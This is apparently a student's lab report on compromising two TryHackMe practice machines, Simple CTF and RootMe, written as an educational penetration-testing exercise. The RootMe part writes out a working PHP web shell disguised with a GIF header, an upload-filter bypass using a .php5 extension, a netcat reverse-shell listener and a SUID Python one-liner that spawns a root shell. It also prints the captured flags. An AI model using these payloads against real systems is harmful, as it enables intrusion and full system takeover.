# Lab 6 – Web Exploitation and Privilege Escalation

## Author
[Oluwaseun Quadri]

## Platform
TryHackMe

## Rooms Completed
- Simple CTF
- RootMe

---

# Executive Summary

This lab documents a full penetration testing workflow conducted against two intentionally vulnerable machines on the TryHackMe platform: Simple CTF and RootMe.

The objective was to perform reconnaissance, enumerate services, identify vulnerabilities, exploit misconfigurations, escalate privileges, and capture all required flags.

Both systems were successfully compromised. Full root-level access was achieved on the RootMe machine.

---

# Lab Environment

Attacker Machine:
- Kali Linux (Virtual Machine)

Network:
- TryHackMe VPN (OpenVPN)

Primary Tools Used:
- Nmap
- Gobuster
- Netcat
- Python
- Linux built-in enumeration commands

Methodology Framework:
1. VPN Connection
2. Host Discovery
3. Port Scanning
4. Service Enumeration
5. Web Enumeration
6. Vulnerability Identification
7. Exploitation
8. Reverse Shell
9. Privilege Escalation
10. Flag Capture

---

# Room 1: Simple CTF

## Step 1 – Reconnaissance

Initial service and version scan:

```bash
nmap -sC -sV <target-ip>
```

Discovered open services:
- FTP
- SSH
- HTTP

This indicated potential attack surfaces for anonymous access, brute force attempts, or web exploitation.

---

## Step 2 – Enumeration

FTP enumeration revealed:
- Anonymous login enabled.

Web enumeration and directory exploration revealed:
- Exposed directories.
- Possible credential leaks.

Further analysis identified weak credentials that allowed system access.

---

## Step 3 – Exploitation

Using discovered credentials, system access was achieved via SSH.

User-level access was obtained successfully.

---

## Step 4 – Flag Capture

User and challenge flags were located and captured.

This confirmed full completion of the Simple CTF objectives.

---

# Room 2: RootMe

## Step 1 – Reconnaissance

Performed detailed scan:

```bash
nmap -sC -sV 10.81.189.171
```

Open ports discovered:
- 22 (SSH)
- 80 (Apache Web Server)

Web server presence indicated potential web-based vulnerabilities.

---

## Step 2 – Web Enumeration

Directory brute-forcing conducted:

```bash
gobuster dir -u http://10.81.189.171 -w /usr/share/wordlists/dirb/common.txt
```

Discovered important directories:
- /panel
- /uploads

The /panel directory contained file upload functionality.

---

## Step 3 – Vulnerability Identification

The file upload feature did not properly validate file extensions.

This allowed bypassing upload restrictions by manipulating file format and extension.

---

## Step 4 – File Upload Bypass Exploitation

Created a malicious web shell:

```php
GIF89a;
<?php system($_GET["cmd"]); ?>
```

The file was renamed:

```
shell.php5
```

This bypassed extension filtering mechanisms and was successfully uploaded.

---

## Step 5 – Remote Code Execution

Accessed uploaded shell:

```
http://10.81.189.171/uploads/shell.php5?cmd=id
```

Output:

```
uid=33(www-data)
```

This confirmed remote command execution as the web server user.

---

## Step 6 – Reverse Shell

Started a Netcat listener:

```bash
nc -lvnp 4444
```

Triggered reverse shell from web shell.

Successfully obtained an interactive shell as:

```
www-data
```

Shell stabilization techniques were applied to improve usability.

---

## Step 7 – User Flag

Navigated file system:

```
/var/www/user.txt
```

Captured user flag:

```
THM{y0u_g0t_a_sh3ll}
```

---

## Step 8 – Privilege Escalation

Enumerated SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Discovered vulnerable binary:

```
/usr/bin/python2.7
```

Exploited misconfigured SUID Python binary:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Privilege escalation successful.

Verified with:

```
id
```

Output:

```
uid=0(root)
```

Full root privileges obtained.

---

## Step 9 – Root Flag

Navigated to:

```
/root/root.txt
```

Captured root flag:

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

# Security Weaknesses Identified

Simple CTF:
- Anonymous FTP access
- Weak credential exposure
- Poor authentication practices

RootMe:
- Improper file upload validation
- Extension filtering bypass
- SUID misconfiguration on Python binary
- Inadequate privilege separation

---

# Skills Demonstrated

- Network reconnaissance
- Service enumeration
- Directory brute-forcing
- File upload bypass techniques
- Web shell deployment
- Remote command execution
- Reverse shell establishment
- Linux privilege escalation via SUID
- Post-exploitation enumeration
- Flag extraction and verification

---

# Impact Assessment

If these vulnerabilities existed in a real production environment, an attacker could:

- Execute arbitrary commands remotely
- Obtain persistent access
- Escalate to root privileges
- Extract sensitive data
- Fully compromise system integrity

---

# Conclusion

Both Simple CTF and RootMe machines were successfully exploited using structured penetration testing methodology.

RootMe resulted in full system compromise through insecure file upload validation and improper SUID configuration.

This lab demonstrates practical offensive security capabilities in web exploitation and Linux privilege escalation, reinforcing the importance of secure development practices and system hardening.

---

# Lab Status

All objectives completed.
All flags captured.
Root access achieved where required.
